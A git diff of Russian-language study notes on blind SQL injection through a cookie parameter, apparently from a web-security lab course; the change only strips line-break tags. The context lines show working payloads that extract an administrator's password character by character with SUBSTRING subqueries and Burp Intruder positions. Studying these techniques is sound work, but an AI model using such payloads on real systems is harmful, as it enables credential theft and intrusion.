@@ -158,8 +158,8 @@ Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND '1'='2<br>
 Например, предположим, что есть таблица с именем Usersи столбцами Usernameи Password, и пользователь с именем Administrator.<br> Вы можете определить пароль для этого пользователя, отправляя серию входных данных для проверки пароля по одному символу за раз.
 
 Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 'm
-**В результате возвращается сообщение "Добро пожаловать обратно", указывающее на то, что внедренное условие истинно, и, следовательно, первый символ пароля m**<br>
-**Это требует гораздо большего количества запросов, поэтому вам потребуется использовать Burp Intruder**<br>
+**В результате возвращается сообщение "Добро пожаловать обратно", указывающее на то, что внедренное условие истинно, и, следовательно, первый символ пароля m**
+**Это требует гораздо большего количества запросов, поэтому вам потребуется использовать Burp Intruder**
 - Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND (SELECT SUBSTRING(password,&1&,1) FROM users WHERE username='administrator')='§a§ **(ВАРИАНТ 1)** <br>
 - Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), &1&, 1) = '&m& **(ВАРИАНТ 2)** <br>
   
